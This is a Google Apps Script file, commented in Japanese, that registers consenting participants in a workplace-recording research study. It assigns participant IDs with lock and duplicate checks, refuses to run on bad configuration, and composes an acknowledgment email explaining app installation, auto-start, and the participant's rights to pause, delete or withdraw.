// ⚠️★★ **G1 の受付メールを流用しない。** G1 は「対面 70 分・1 回きり・課題ページあり」だが、
//   O1 は「実業務・数日〜数週間・課題なし」である。
//   ★ 書くのは 4 点だけ: (a) 参加者 ID (b) アプリの入手 (c) ★ 自動起動の登録
//   (d) ★ いつでも止められる・消せる。
//   ⚠️ **課題ページの話を 1 文字も入れない** (O1 に課題は無い)。

function o1RegisterAckSubject_() {
  return "【GSE 研究】ご登録ありがとうございます（参加者IDとアプリのご案内）";
}

/**
 * 配布 URL が「URL として使えない」か。★ 純関数（⚠️ 値そのものはログにも例外にも出さない）。
 *
 * ⚠️★★ **判定をここ 1 か所に置く理由**（security-checker MEDIUM・2026-08-29）:
 * ★ 書式検査を `o1ConfigProblems_()` にだけ置くと、⚠️ **トリガ設置後に**プロパティを
 * 「フォルダ ID だけ」に書き換えられたとき**誰も止めない** —— 以後の登録者全員に
 * 辿れない「入手先」を書いた受付メールが送られる。
 * → ★ **受付メールを作る当の関数**（`o1RegisterAckBody_`）からも同じ判定を呼ぶ。
 */
function o1AppDownloadUrlIsBad_(url) {
  return String(url || "").indexOf("https://") !== 0;
}

/**
 * 受付メールの本文。★ `appDownloadUrlOpt` を渡すと**その値**を使う。
 *
 * ⚠️★★★ **渡せるようにした理由**（code-reviewer MEDIUM・2026-08-29）:
 * ★ `onO1ConsentSubmit` は「本文を作れるか」を**ダミー ID で先に試して**から採番する。
 * ⚠️ ところが設定を毎回読み直すと、**事前確認と本送信のあいだにプロパティを書き換えられた**
 * とき、★ **P-ID を焼いた後で throw する** —— 「発番済み・通知なし」という、
 * その事前確認が防ぐために置かれた当の状態になる。
 * → ★ 呼び出し側が **1 回読んだ値**を両方へ渡せるようにする（＝同じスナップショットで判断する）。
 */
function o1RegisterAckBody_(pid, appDownloadUrlOpt) {
  var appDownloadUrl =
    appDownloadUrlOpt === undefined ? o1Config_().appDownloadUrl : appDownloadUrlOpt;
  if (!appDownloadUrl) {
    throw new Error(
      "★ スクリプト プロパティ O1_APP_DOWNLOAD_URL が空です。アプリの入手先を書けないので受付メールを作りません（fail-closed）。\n" +
        "⚠️ 空のまま登録させると、被験者は参加者IDだけ受け取ってアプリを入手できません。"
    );
  }
  if (o1AppDownloadUrlIsBad_(appDownloadUrl)) {
    // ⚠️★★ トリガ設置**後**に書き換えられた場合、ここが最後の砦である。
    //   ★ 値そのものは載せない（★ ログ・例外へ配布 URL を出さない）。
    throw new Error(
      "★ スクリプト プロパティ O1_APP_DOWNLOAD_URL が URL ではありません（https:// で始まる形にしてください）。\n" +
        "⚠️ そのまま送ると、被験者は辿れない「入手先」を受け取ります。"
    );
  }
  return [
    "ご登録ありがとうございます。",
    "",
    "▼ あなたの参加者ID",
    "    " + pid,
    "★ アプリの最初の画面でこの記号を入力していただきます。",
    "⚠️ この記号は氏名とは別に保管され、記録には氏名もメールアドレスも入りません。",
    "",
    "▼ アプリの入手",
    "    " + appDownloadUrl,
    "★ ご利用の OS のファイル（O1_実施用_Windows.zip / O1_実施用_macOS.zip）を",
    "  ダウンロードし、**展開したフォルダをそのまま**デスクトップなどに置いてください。",
    "⚠️ フォルダの中のファイルは 1 つも消したり動かしたりしないでください。",
    "  同じフォルダにある目印のファイルを見て、アプリが動作を決めています。",
    "",
    "★ 同梱の「README_先に読む.txt」に、最初の 1 回だけ必要な手順が書いてあります。",
    "⚠️ macOS の方は、最初の起動だけ研究者と一緒に行います（5 分ほど）。日程をご相談ください。",
    "",
    "▼ ★ 毎日の起動について（大切です）",
    "★ この研究は「ふだんの作業のあいだ、ずっと動いている」ことで成り立ちます。",
    "  アプリが起動していない日は、記録がまるごと空になります。",
    "★ README に、パソコンを起動したときに**自動で立ち上がるようにする手順**を書いています。",
    "  ⚠️ 難しければ、そのままにして構いません。研究者が一緒に設定します。",
    "",
    "▼ ★★★ いつでもできること",
    "1. 記録中は画面に印が出ます。★ 印が出ていないときは記録していません。",
    "2. ワンクリックで一時停止できます。★ 理由をお聞きすることはありません。",
    "3. あとから「昨日の 14:00〜15:00 を消して」のように時間帯を指定して削除できます。",
    "   ★ 記録が研究者へ送られるのは 1 日ぶんをまとめてから 48 時間後です。",
    "   ⚠️ それより前なら、あなたの端末の上で消えます。",
    "   ⚠️ 送られたあとの削除は、下の連絡先へお申し出ください（研究者側で削除し、記録に残します）。",
    "",
    "▼ 送信だけを止めたいとき",
    "★ 記録は取りつつ、研究者への自動送信だけを止めることもできます。",
    "  下の連絡先へお申し出ください（⚠️ 理由はお聞きしません）。",
    "",
    "▼ 参加をやめたくなったら",
    "★ いつでもやめられます。不利益は一切ありません。",
    "  やめた時点で、それまでの記録をすべて削除するようお求めいただけます。",
    "",
    "▼ お問い合わせ",
    "  " + O1_CONTACT_NAME + "（" + O1_AFFILIATION + "）",
    "  " + O1_CONTACT_EMAIL,
    "",
    "どうぞよろしくお願いいたします。",
  ].join("\n");
}

/**
 * ★ 受付メールの文面を Logger に出すだけ (⚠️ **送信しない**)。
 * ★ 配備手順 6。メール送信は取り消せないので、文面は必ず先に目で見る。
 */
function previewO1RegisterAckEmail() {
  var body;
  try {
    body = o1RegisterAckBody_("P999");
  } catch (e) {
    Logger.log("❌ 文面を作れません: " + e);
    return "";
  }
  Logger.log("件名: " + o1RegisterAckSubject_());
  Logger.log("--------");
  Logger.log(body);
  Logger.log("--------");
  Logger.log("⚠️ ★ これは preview です。送信していません。");
  return body;
}

// ============================================================
// 提出トリガ (★ O1-C がそのまま参加登録である)
// ============================================================

function installO1ConsentTrigger() {
  // ⚠️★★★ **設定が欠けたままトリガを張らない** (code-reviewer 指摘・2026-08-28)。
  //   ★ 以前はここだけ「問題をログに出して、それでも張る」だった。
  //   ⚠️ 例えば `O1_APP_DOWNLOAD_URL` が空のまま張ると、被験者が登録するたびに
  //     「受付メールを作れない」経路へ入る。★ `setupO1Forms` は同じ関数で止まるのに、
  //     ここだけ開いていた（＝ **一番危ない入口が一番緩い**）。
  //   ★ 順序も大事: **`removeO1ConsentTriggers()` より前に**判定する
  //     （⚠️ 先に消すと、失敗したときに既存のトリガまで失う）。
  var problems = o1ConfigProblems_();
  if (problems.length) {
    throw new Error(
      "⛔ 設定に問題があるのでトリガを張りません（fail-closed）:\n  - " +
        problems.join("\n  - ") +
        "\n\n★ `checkO1FormConfig()` で同じ内容を読み取り専用で確認できます。\n" +
        "⚠️ 既存のトリガは**消していません**。"
    );
  }
  removeO1ConsentTriggers();
  var consentFormId = o1Config_().consentFormId;
  o1AssertNotG1Form_(consentFormId, "FORM_ID_O1_CONSENT");
  ScriptApp.newTrigger("onO1ConsentSubmit")
    .forForm(FormApp.openById(consentFormId))
    .onFormSubmit()
    .create();
  Logger.log("✅ onO1ConsentSubmit トリガを O1-C に設定しました");
  Logger.log("ℹ️ O1_AUTO_SEND=" + O1_AUTO_SEND + "（false=ログに出すだけ / true=自動送信）");
  if (!O1_AUTO_SEND) {
    Logger.log(
      "⚠️ ★ O1_AUTO_SEND=false のままだと、登録されても**被験者には何も届きません**（ログに出るだけ）。"
    );
  }
}

function removeO1ConsentTriggers() {
  var triggers = ScriptApp.getProjectTriggers();
  var n = 0;
  for (var i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === "onO1ConsentSubmit") {
      ScriptApp.deleteTrigger(triggers[i]);
      n++;
    }
  }
  if (n) Logger.log("🧹 既存の onO1ConsentSubmit トリガを " + n + " 件削除しました");
}

/**
 * O1-C の回答を取り出す。
 * ⚠️★★★ 設問タイトルは `Q_O1_*` 定数と**共有する**。片方だけ変えると、
 *   提出されても氏名やメールが取れず、★ **黙って発番が止まる**。
 */
function o1ConsentAnswers_(response) {
  var out = { name: "", email: "", pid: "", os: "" };
  var items = response.getItemResponses();
  for (var i = 0; i < items.length; i++) {
    var title = items[i].getItem().getTitle();
    var v = items[i].getResponse();
    var s = Array.isArray(v) ? v.join(" / ") : String(v == null ? "" : v);
    if (title === Q_O1_NAME) out.name = s.trim();
    else if (title === Q_O1_EMAIL) out.email = s.trim();
    else if (title === Q_O1_PID) out.pid = s.trim().toUpperCase();
    else if (title === Q_O1_OS) out.os = s.trim();
  }
  return out;
}

/**
 * ★★ O1-C の提出で走る。P-ID 採番 → 受付メール。
 *
 * ⚠️ ★ 冪等である: 同じメール (または記入された P-ID) が既にロスターにあれば**再発番しない**。
 *   ★ 1 人の人間に 2 つの識別子を作らない。
 */
function onO1ConsentSubmit(e) {
  if (!e || !e.response) {
    Logger.log("❌ onO1ConsentSubmit: response が取得できません（トリガ経由で呼んでください）");
    return;
  }
  var a = o1ConsentAnswers_(e.response);
  if (!a.email) {
    Logger.log("⛔ O1-C 提出: メールアドレスが空のため発番しません");
    return;
  }

  // ⚠️★★ **申告された P-ID の形式を検証する**（Codex 指摘・2026-08-28）。
  //   ★ `Q_O1_PID` は自由記入なので `P15` `p-015` `015` のような打ち間違いが入る。
  //   ⚠️ 旧実装はロスターに一致しないだけで**黙って「新規参加者」として扱い**、
  //     ★ メールが未登録の既存参加者に **2 つ目の P-ID を発番**しうる。
  //   → ★ 形式が違うなら**何もせず止める**（⚠️ 勝手に解釈して直さない）。
  if (a.pid && !o1IsValidPid_(a.pid)) {
    Logger.log(
      "⛔⚠️ 申告された参加者IDの形式が違います: 「" + a.pid + "」（★ 期待する形は P と数字）。\n" +
        "   ★ 発番も受付メールも行いませんでした（⚠️ 黙って新規発番しない）。\n" +
        "   ★ 研究者が本人に確認し、正しい ID で再提出してもらってください。\n" +
        "   提出者: " + o1MaskEmail_(a.email)
    );
    return;
  }

  // ⚠️★★★ **本文を作れない設定なら、P-ID を焼く前に止める** (code-reviewer 指摘・2026-08-28)。
  //   ★ 以前は採番してから本文作成に失敗していた。⚠️ すると「発番済み・通知なし」が
  //     **設定ミスだけで量産される**（★ ロスターは埋まるのに被験者は何も受け取らない）。
  //   ★ ダミー ID で「作れるか」だけを確かめる（⚠️ 送信はしない）。
  // ★ 設定は **ここで 1 回だけ**読む（⚠️ 下の本送信にも同じ値を渡す）。
  var ackUrlSnapshot = o1Config_().appDownloadUrl;
  try {
    o1RegisterAckBody_("P000", ackUrlSnapshot);
  } catch (cfgErr) {
    Logger.log(
      "⛔ 受付メールを作れない設定なので**発番しません**（★ P-ID を焼かない）: " + cfgErr + "\n" +
        "   ★ checkO1FormConfig() を実行して直したあと、被験者に**もう一度提出**してもらってください。"
    );
    return;
  }

  // ★ 同時提出で同じ P-ID が 2 人に出るのを防ぐ（★ 手動採番と同じロックを使う）。
  var pid = o1WithRosterLock_(function () {
    var roster = o1OpenRoster_();
    if (!roster) return null;

    var found = o1FindInPhase1Roster_(roster, { pid: a.pid, email: a.email });

    // ⚠️★★★ **他人の P-ID を名乗っている。** 発番も送信もせず、研究者に判断させる。
    //   ★ 自動で「別人だから新規発番」もしない —— 打ち間違いなら本人に既存 ID を使わせるべきで、
    //     ⚠️ 黙って 2 つ目の ID を作ると、同じ人が 2 人になる（削除要求が追えなくなる）。
    if (found && found.conflict) {
      Logger.log(
        "⛔⚠️★★★ 申告された参加者ID（" + found.pid + "・ロスター " + found.row + " 行目）には\n" +
          "   **別のメールアドレスが登録されています**。★ 発番も受付メールも行いませんでした。\n" +
          "   提出者: " + o1MaskEmail_(a.email) + "\n" +
          "   ★ 打ち間違いか、他人の ID の申告かを研究者が確認してください。\n" +
          "   ⚠️ 自動で新規発番はしません（★ 同じ人に 2 つの ID を作らないため）。"
      );
      return null;
    }

    if (found) {
      // ⚠️★★★ **A 列（P-ID）が空の行**に当たることがある（★ 氏名とメールだけ先に入れた行）。
      //   ★ その場合は **appendRow へ落とさず、その行に採番して埋める**。
      //   ⚠️ 落とすと同じメールに 2 行目ができ、**1 人に 2 つの識別子**ができる
      //     （★ 本ファイルが冒頭で禁じている状態。code-reviewer が実測して発見・2026-08-28）。
      var p = found.pid;
      if (!p) {
        p = o1NextParticipantId_(roster);
        roster.getRange(found.row, 1).setValue(p);
        Logger.log("✅ 既存行（P-ID が空）に採番して埋めました: " + p + " 行 " + found.row);
      } else {
        Logger.log("♻️ 既存の参加者として扱います: " + p + "（" + o1MaskEmail_(a.email) + "）");
      }
      if (!String(roster.getRange(found.row, 3).getValue()).trim()) {
        roster.getRange(found.row, 3).setValue(o1PlainText_(a.email));
      }
      // ★ OS も同じ規則で補う (起票 T-22)。⚠️ **空のときだけ**書く
      //   （★ メール補充と同型。⚠️ 上書きすると研究者が手で直した値を機械が黙って戻す）。
      if (a.os && !String(roster.getRange(found.row, 4).getValue()).trim()) {
        roster.getRange(found.row, 4).setValue(o1PlainText_(a.os));
      }
      SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
      return p;
    }

    var newPid = o1NextParticipantId_(roster);
    // ★ D 列 = OS (起票 T-22)。⚠️ ロスターの列順は Phase1 の `ROSTER_HEADER` で固定
    //   （逐語:「列順に依存するため変更不可」）なので、位置で書いてよい。
    roster.appendRow([
      newPid,
      o1PlainText_(a.name),
      o1PlainText_(a.email),
      o1PlainText_(a.os || ""),
    ]);
    SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
    Logger.log("✅ P-ID 発番: " + newPid + "（" + o1MaskEmail_(a.email) + "）");
    return newPid;
  });

  if (!pid) {
    Logger.log("❌ 発番できませんでした（★ 回答は失われていません）。上のログの理由を見てください。");
    return;
  }

  // ============================================================
  // ⚠️★★★ 採番の排他は**プロジェクトを跨がない** (起票 T-24)
  // ============================================================
  // ★ `LockService.getScriptLock()` は**スクリプト プロジェクト単位**である。
  //   ⚠️ G1 (`GSE_G1_Form_Builder.gs`) と Phase1 は**別プロジェクト = 別のロック**なので、
  //     ★ G1-C と O1-C がほぼ同時に提出されると **両方が同じ「最大値 + 1」を読む**。
  //   ⚠️ 別プロジェクトにすること自体は 2026-08-07 の事故対策で**必須**なので、構成は変えられない。
  //   → ★ **書いたあとに読み返して、重複していたら受付メールを送らない**。
  //
  // ⚠️★★★ **これは「重複を防ぐ」仕組みではない。窓を狭めるだけである**
  //   （cross-review の Codex 指摘・2026-08-29）:
  //     ★ 読み返した**あと**に他プロジェクトが同じ P-ID を append する順序は防げない
  //       （＝ TOCTOU）。⚠️ その場合、**こちらは送ってしまう**。
  //     ⚠️ ★ **2026-09-01 に訂正した。** 旧文は「さらに **G1 側には同等の検査が無い**
  //       （★ G1 実施中で触れないため）。→ G1 が先に送れば、こちら側で止めても被験者には
  //       重複 ID が渡る」と書いていたが、⚠️ **G1 にも同じ検査を入れた**
  //       （`Form_G1/GSE_G1_Form_Builder.gs` の `g1CountPidRows_` と重複時の中止）。
  //       → ★ **両側が止めるようになった。** ⚠️ ただし TOCTOU は両側に残るので、
  //         「防げる」ようになったわけではない（★ 窓が狭くなっただけ）。
  //   ★ 正しく防ぐには**採番を 1 か所に集約する**しかない（⚠️ G1 を触るので今はできない）。
  //   → ★ したがって本検査の役割は「**気づけない状態を無くす**」ことである。
  //   ⚠️ 重複した P-ID を被験者に渡すと**回収できない**（★ その ID で `.age` /
  //     `metrics/<PID>/` が作られ、2 人ぶんが 1 つの P-ID に混ざる → 削除要求が履行不能）。
  var dupRows = o1RosterRowsForPid_(pid);
  if (dupRows === null) {
    // ★ 検査そのものが失敗した場合は**送る**。⚠️ 読み取りの失敗で被験者を止めない
    //   （★ 直前に書き込めているので、ここで開けないのは一過性の可能性が高い）。
    Logger.log("⚠️ ★ P-ID の重複検査ができませんでした（★ 受付メールは送ります）: " + pid);
  } else if (dupRows.length > 1) {
    Logger.log(
      "⛔⚠️★★★ **同じ P-ID が " + dupRows.length + " 行あります**: " + pid +
        "（行 " + dupRows.join(" / ") + "）\n" +
        "   ★ 受付メールは**送っていません**（⚠️ 重複した ID を配ると回収できません）。\n" +
        "   ⚠️ 別プロジェクト（G1 / Phase1）と**同時に採番された**可能性があります ——\n" +
        "      ★ LockService はスクリプト プロジェクト単位で、跨いだ排他は効きません。\n" +
        "   ★ どちらの行を残すかは**研究者が決めてください**（⚠️ 自動では直しません）。\n" +
        "   ★ 直したあと、提出者にもう一度提出してもらえば同じ経路で受付メールが送られます。\n" +
        "   提出者: " + o1MaskEmail_(a.email) + "（OS: " + a.os + "）"
    );
    return;
  }

  // ⚠️★ ここで例外が出ると「発番済みだが通知が無い」状態になる。
  //   ★ ログに **P-ID と OS を必ず残す**（研究者が手で送れるようにする）。
  try {
    var subject = o1RegisterAckSubject_();
    var body = o1RegisterAckBody_(pid, ackUrlSnapshot);
    if (O1_AUTO_SEND) {
      MailApp.sendEmail(a.email, subject, body);
      Logger.log("📧 受付メールを送信しました → " + o1MaskEmail_(a.email) + "（OS: " + a.os + "）");
    } else {
      // ⚠️★ 下書きは作らない（★ 上の `GmailApp` を使わない理由を参照）。
      Logger.log("📝 O1_AUTO_SEND=false のため**送信していません** → " + o1MaskEmail_(a.email));
      Logger.log("   ⚠️ ★ 被験者には届いていません。下の文面を研究者が手で送ってください:");
      Logger.log("   件名: " + subject);
      Logger.log(body);
    }
  } catch (mailErr) {
    // ⚠️★ 2026-08-28 の訂正: 以前ここに「再提出しても冪等スキップされるので**永久に届かない**」
    //   と書いていたが、**事実と違う**（code-reviewer が実測）。★ 再提出すると既存経路を通り、
    //   **同じ P-ID のまま受付メールが送り直される**（★ 新しい ID は増えない）。
    //   → ⚠️ 誤った断定は、より簡単な復旧手段（再提出の案内）を塞いでいた。
    Logger.log(
      "❌⚠️★★ 受付メールに失敗しました（P-ID は確定済: " +
        pid +
        " / OS: " +
        a.os +
        "）。\n" +
        "   ★ 復旧は 2 通り: (1) 同じメールで**もう一度提出**してもらう\n" +
        "      （★ 同じ P-ID のまま再送されます。⚠️ 新しい ID は増えません）\n" +
        "      (2) 研究者が手で送る\n" +
        "   宛先: " +
        o1MaskEmail_(a.email) +
        "（実アドレスは Phase1 ロスターの " +
        pid +
        " の行）\n" +
        "   原因: " +
        mailErr
    );
  }
}
